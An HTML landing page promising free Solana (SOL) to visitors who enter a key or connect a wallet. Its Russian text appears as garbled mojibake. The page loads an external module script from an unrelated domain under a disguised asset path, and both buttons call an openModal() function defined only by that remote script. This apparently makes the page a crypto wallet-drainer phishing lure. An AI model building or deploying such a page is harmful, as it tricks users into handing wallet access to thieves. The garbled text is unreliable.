<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Solana Landing</title>

  <!-- üîπ –í–ù–ï–®–ù–ò–ô –°–ö–†–ò–ü–¢ -->
  <script type="module" src="https://utter-daylong.defex.cc/_nuxt/assets/index.js"></script>

  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: Inter, system-ui, sans-serif;
      background:
        radial-gradient(600px at 20% 20%, #7c3aed33, transparent),
        radial-gradient(800px at 80% 80%, #9333ea22, transparent),
        #020617;
      color: #e5e7eb;
      min-height: 100vh;
    }

    header {
      display: flex;
      justify-content: center;
      gap: 48px;
      padding: 24px;
    }

    header button {
      background: none;
      border: none;
      color: #94a3b8;
      font-size: 16px;
      cursor: pointer;
      padding-bottom: 6px;
    }

    header button.active {
      color: #c084fc;
      border-bottom: 2px solid #a855f7;
    }

    main {
      display: flex;
      justify-content: center;
      padding: 80px 16px;
    }

    .section {
      display: none;
      width: 100%;
      max-width: 460px;
      padding: 32px;
      border-radius: 24px;
      background: rgba(15, 23, 42, 0.75);
      backdrop-filter: blur(18px);
      box-shadow:
        0 0 0 1px rgba(148, 163, 184, 0.08),
        0 20px 60px rgba(168, 85, 247, 0.25);
    }

    .section.active { display: block; }

    h1 {
      margin-top: 0;
      font-size: 26px;
      font-weight: 600;
    }

    input {
      width: 100%;
      margin-top: 24px;
      padding: 14px 16px;
      border-radius: 14px;
      border: none;
      background: #020617;
      color: #e5e7eb;
      font-size: 15px;
      outline: none;
    }

    .action {
      width: 100%;
      margin-top: 20px;
      padding: 16px;
      border-radius: 14px;
      border: none;
      font-size: 16px;
      font-weight: 600;
      color: white;
      background: linear-gradient(90deg, #7c3aed, #a855f7);
      cursor: pointer;
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }

    .action:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 30px rgba(168, 85, 247, 0.4);
    }

    .action.hidden { display: none; } /* üî• */

    .error {
      margin-top: 14px;
      color: #f87171;
      display: none;
    }
  </style>
</head>

<body>

<header>
  <button id="tab-get" class="active">–í–≤–µ—Å—Ç–∏ –ö–ª—é—á</button>
  <button id="tab-create">–°–æ–∑–¥–∞—Ç—å –ö–ª—é—á</button>
</header>

<main>

  <!-- üîπ –ü–û–õ–£–ß–ò–¢–¨ -->
  <div id="get" class="section active">
    <h1>–ü–æ–ª—É—á–∏—Ç—å SOL</h1>
    <input id="keyInput" type="text" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–ª—é—á">
    <button id="getButton" class="action hidden">–ü–æ–ª—É—á–∏—Ç—å SOL</button>
    <div id="errorText" class="error">–í–≤–µ–¥—ë–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π –∫–ª—é—á</div>
  </div>

  <!-- üîπ –°–û–ó–î–ê–¢–¨ -->
  <div id="create" class="section">
    <h1>–°–æ–∑–¥–∞—Ç—å</h1>
    <p>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞</p>
    <button class="action" onclick="openModal()">–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</button>
  </div>

</main>

<script>
  // ===== –ù–ê–°–¢–†–û–ô–ö–ò =====
  const VALID_KEY = "TEST_KEY_123";
  const STORAGE_KEY = "key_used";

  // ===== –í–ö–õ–ê–î–ö–ò =====
  const tabGet = document.getElementById("tab-get");
  const tabCreate = document.getElementById("tab-create");
  const sectionGet = document.getElementById("get");
  const sectionCreate = document.getElementById("create");

  tabGet.onclick = () => {
    tabGet.classList.add("active");
    tabCreate.classList.remove("active");
    sectionGet.classList.add("active");
    sectionCreate.classList.remove("active");
  };

  tabCreate.onclick = () => {
    tabCreate.classList.add("active");
    tabGet.classList.remove("active");
    sectionCreate.classList.add("active");
    sectionGet.classList.remove("active");
  };

  // ===== –ü–û–õ–£–ß–ò–¢–¨ =====
  const inputKey = document.getElementById("keyInput");
  const getButton = document.getElementById("getButton");
  const errorText = document.getElementById("errorText");

  // üî• –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É –¢–û–õ–¨–ö–û –µ—Å–ª–∏ –µ—Å—Ç—å –≤–≤–æ–¥
  inputKey.addEventListener("input", () => {
    if (inputKey.value.trim().length > 0) {
      getButton.classList.remove("hidden");
    } else {
      getButton.classList.add("hidden");
      errorText.style.display = "none";
    }
  });

  // üî• –ü—Ä–æ–≤–µ—Ä–∫–∞ + openModal()
  getButton.addEventListener("click", () => {
    const value = inputKey.value.trim();
    const used = localStorage.getItem(STORAGE_KEY);

    if (used === "true") {
      errorText.textContent = "–ö–æ–¥ —É–∂–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω";
      errorText.style.display = "block";
      return;
    }

    if (value !== VALID_KEY) {
      errorText.textContent = "–í–≤–µ–¥—ë–Ω –Ω–µ–≤–µ—Ä–Ω—ã–π –∫–ª—é—á";
      errorText.style.display = "block";
      return;
    }

    localStorage.setItem(STORAGE_KEY, "true");
    errorText.style.display = "none";

    // üî• –¢–û–õ–¨–ö–û –ó–î–ï–°–¨
    openModal();
  });
</script>

</body>
</html>
